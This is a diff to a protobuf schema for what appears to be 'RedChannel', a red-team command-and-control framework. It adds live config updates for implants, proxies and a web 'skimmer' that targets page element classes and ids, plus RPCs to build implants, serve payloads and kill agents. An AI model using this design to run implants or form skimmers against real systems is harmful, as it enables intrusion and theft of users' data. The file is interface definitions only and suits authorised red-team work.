@@ -2,6 +2,7 @@ syntax = "proto3";
 
 package c2;
 
+import "google/protobuf/wrappers.proto";
 import "implant.proto";
 
 message C2Config {
@@ -19,11 +20,11 @@ message C2Config {
   uint32 web_port = 5;
   // the external url of the web server: http://c2.redchannel.tld
   // this will be the base of the binary_route
-  string web_url = 7;
+  string web_url = 6;
   // the route to serve the binary from on the web server
   // ie: /payload.exe - agent code will be available at
   // http://[web_ip]:[web_port]/payload.exe
-  string binary_route = 6;
+  string binary_route = 7;
 
   // the bind ip of the teamserver
   string ts_ip = 8;
@@ -134,7 +135,7 @@ enum ServerEvent {
 
 message Agent {
   string agent_id = 1;
-  bool has_keyx = 2;
+  bool has_pubkey = 2;
   uint32 lastseen = 3;
   repeated string ip = 4;
   uint32 sendq_size = 5;
@@ -150,10 +151,7 @@ message GetAgentsResponse {
   string message = 3;
 }
 
-message KeyxRequest {
-  string agent_id = 1;
-  bool all_agents = 2;
-}
+message KeyxRequest { string agent_id = 1; }
 message KeyxResponse {
   CommandStatus status = 1;
   string message = 2;
@@ -187,10 +185,52 @@ message AgentCommandResponse {
   CommandStatus status = 1;
   string message = 2;
 }
-message SetConfigRequest { RedChannelConfig config = 1; }
+
+// this allows over the network, live updates of the config
+// we do not allow operators to modify every part of the config
+// so, some fields from the *Config messages are not available
+//
+// we also use google wrappers to differentiate between undefined and
+// defaults
+
+message UpdatedConfig {
+  message C2 { .google.protobuf.BoolValue debug = 1; }
+  message Implant {
+    .google.protobuf.UInt32Value interval = 1;
+    .google.protobuf.BoolValue debug = 2;
+    .google.protobuf.StringValue proxy_url = 3;
+    .google.protobuf.BoolValue proxy_enabled = 4;
+    .google.protobuf.StringValue proxy_key = 5;
+    .google.protobuf.BoolValue throttle_sendq = 6;
+  }
+  message Proxy {
+    .google.protobuf.BoolValue enabled = 1;
+    .google.protobuf.StringValue url = 2;
+    .google.protobuf.StringValue key = 3;
+    .google.protobuf.UInt32Value interval = 4;
+    .google.protobuf.BoolValue obfuscate_payload = 5;
+  }
+  message Skimmer {
+    repeated string target_classes = 1;
+    repeated string target_ids = 2;
+    .google.protobuf.BoolValue obfuscate_payload = 3;
+  }
+
+  C2 c2 = 1;
+  Proxy proxy = 2;
+  Implant implant = 3;
+  Skimmer skimmer = 4;
+}
+message SetConfigRequest { UpdatedConfig config = 1; }
 message SetConfigResponse {
   CommandStatus status = 1;
   string message = 2;
+}
+
+message GetConfigRequest {}
+message GetConfigResponse {
+  CommandStatus status = 1;
+  RedChannelConfig config = 2;
 }
 
 enum LogLevel {
@@ -222,6 +262,12 @@ message GenerateProxyPayloadResponse {
   string message = 3;
 }
 
+message KillAgentRequest { string agent_id = 1; }
+message KillAgentResponse {
+  CommandStatus status = 1;
+  string message = 2;
+}
+
 service RedChannel {
   rpc GetAgents(GetAgentsRequest) returns (GetAgentsResponse);
   rpc Keyx(KeyxRequest) returns (KeyxResponse);
@@ -229,6 +275,7 @@ service RedChannel {
 
   rpc BuildImplant(BuildImplantRequest) returns (BuildImplantResponse);
   rpc GetBuildLog(GetBuildLogRequest) returns (GetBuildLogResponse);
+  rpc KillAgent(KillAgentRequest) returns (KillAgentResponse);
 
   rpc ProxyLoop(ProxyLoopRequest) returns (ProxyLoopResponse);
   rpc ForceFetch(ForceFetchRequest) returns (ForceFetchResponse);
@@ -236,6 +283,7 @@ service RedChannel {
       returns (GenerateProxyPayloadResponse);
 
   rpc SetConfig(SetConfigRequest) returns (SetConfigResponse);
+  rpc GetConfig(GetConfigRequest) returns (GetConfigResponse);
 
   rpc StreamLog(StreamLogRequest) returns (stream StreamLogResponse);
 }
